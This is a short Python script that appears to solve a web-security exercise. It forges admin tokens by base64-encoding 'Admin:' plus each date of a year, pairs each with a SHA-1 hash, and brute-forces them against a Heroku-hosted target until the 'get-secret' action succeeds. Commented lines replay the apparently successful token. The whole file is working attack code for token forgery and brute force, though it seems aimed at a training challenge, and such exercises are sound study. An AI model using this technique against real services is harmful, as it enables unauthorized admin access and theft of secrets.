import requests
import hashlib
import base64

name = "Admin:"
found = False
for j in range(1, 12):
    for i in range(1, 32):
        message = f"{name}{str(i).zfill(2)}/{str(j).zfill(2)}/26"
        h = hashlib.sha1(message.encode()).hexdigest()
        e = base64.b64encode(message.encode()).decode()
        res = requests.post("http://web-security-blackbox-2.herokuapp.com", json = {"token": e, "hash": h, "action": "get-secret"})
        print(f"{i}/{j}: {res.text}")
        if "error" not in res.text:
            found = True
            break
    if found:
        break
# h = hashlib.sha1("Admin:29/04/26".encode()).hexdigest()
# t = base64.b64encode("Admin:29/04/26".encode()).decode()
# res = requests.post("http://web-security-blackbox-2.herokuapp.com", json = {"token": t, "hash": h, "action": "get-secret"})
# print(res.text)